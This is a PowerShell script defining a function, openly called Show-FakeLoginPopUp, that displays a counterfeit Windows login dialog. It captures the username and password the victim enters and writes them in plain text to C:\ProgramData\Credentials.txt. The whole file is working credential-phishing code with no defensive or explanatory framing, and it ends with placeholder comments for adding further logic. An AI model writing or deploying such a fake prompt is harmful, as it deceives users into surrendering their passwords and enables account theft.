# Function to show a fake login page
function Show-FakeLoginPopUp {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Create the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Login"
    $form.Size = New-Object System.Drawing.Size(300, 200)
    $form.StartPosition = "CenterScreen"

    # Create the username label and textbox
    $usernameLabel = New-Object System.Windows.Forms.Label
    $usernameLabel.Location = New-Object System.Drawing.Point(10, 20)
    $usernameLabel.Size = New-Object System.Drawing.Size(100, 20)
    $usernameLabel.Text = "Username:"
    $form.Controls.Add($usernameLabel)

    $usernameTextBox = New-Object System.Windows.Forms.TextBox
    $usernameTextBox.Location = New-Object System.Drawing.Point(120, 20)
    $usernameTextBox.Size = New-Object System.Drawing.Size(150, 20)
    $form.Controls.Add($usernameTextBox)

    # Create the password label and textbox
    $passwordLabel = New-Object System.Windows.Forms.Label
    $passwordLabel.Location = New-Object System.Drawing.Point(10, 50)
    $passwordLabel.Size = New-Object System.Drawing.Size(100, 20)
    $passwordLabel.Text = "Password:"
    $form.Controls.Add($passwordLabel)

    $passwordTextBox = New-Object System.Windows.Forms.TextBox
    $passwordTextBox.Location = New-Object System.Drawing.Point(120, 50)
    $passwordTextBox.Size = New-Object System.Drawing.Size(150, 20)
    $passwordTextBox.PasswordChar = '*'
    $form.Controls.Add($passwordTextBox)

    # Create the login button
    $loginButton = New-Object System.Windows.Forms.Button
    $loginButton.Location = New-Object System.Drawing.Point(100, 100)
    $loginButton.Size = New-Object System.Drawing.Size(100, 25)
    $loginButton.Text = "Login"
    $loginButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $form.AcceptButton = $loginButton
    $form.Controls.Add($loginButton)

    # Show the form and wait for the result
    $result = $form.ShowDialog()

    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        Log-Message "User logged in with username: $($usernameTextBox.Text)"
        $credentials = "Username: $($usernameTextBox.Text)`nPassword: $($passwordTextBox.Text)"
        $credentials | Out-File -FilePath "C:\ProgramData\Credentials.txt" -Force
        # Here you can add your logic for successful login
    } else {
        Log-Message "User cancelled the login."
        # Here you can add your logic for cancelled login
    }
}
